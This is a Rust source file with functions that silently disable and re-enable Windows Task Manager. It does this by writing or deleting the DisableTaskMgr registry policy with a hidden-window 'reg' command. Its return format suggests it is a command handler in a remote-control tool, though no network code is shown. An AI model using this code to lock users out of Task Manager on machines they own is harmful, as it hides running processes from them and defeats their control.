use std::process::Command;

#[cfg(windows)]
use std::os::windows::process::CommandExt;

#[cfg(windows)]
const CREATE_NO_WINDOW: u32 = 0x08000000;

pub async fn disable_task_manager() -> (String, i32) {
    #[cfg(target_os = "windows")]
    {
        let result = Command::new("reg")
            .args(["add", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 
                   "/v", "DisableTaskMgr", "/t", "REG_DWORD", "/d", "1", "/f"])
            .creation_flags(CREATE_NO_WINDOW)
            .output();
        
        match result {
            Ok(output) if output.status.success() => ("Task Manager disabled".to_string(), 0),
            Ok(_) => ("Failed to disable Task Manager".to_string(), 1),
            Err(e) => (format!("Error: {}", e), 1),
        }
    }
    
    #[cfg(not(target_os = "windows"))]
    {
        ("Task Manager control only available on Windows".to_string(), 1)
    }
}

pub async fn enable_task_manager() -> (String, i32) {
    #[cfg(target_os = "windows")]
    {
        let result = Command::new("reg")
            .args(["delete", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 
                   "/v", "DisableTaskMgr", "/f"])
            .creation_flags(CREATE_NO_WINDOW)
            .output();
        
        match result {
            Ok(_) => ("Task Manager enabled".to_string(), 0),
            Err(e) => (format!("Error: {}", e), 1),
        }
    }
    
    #[cfg(not(target_os = "windows"))]
    {
        ("Task Manager control only available on Windows".to_string(), 1)
    }
}
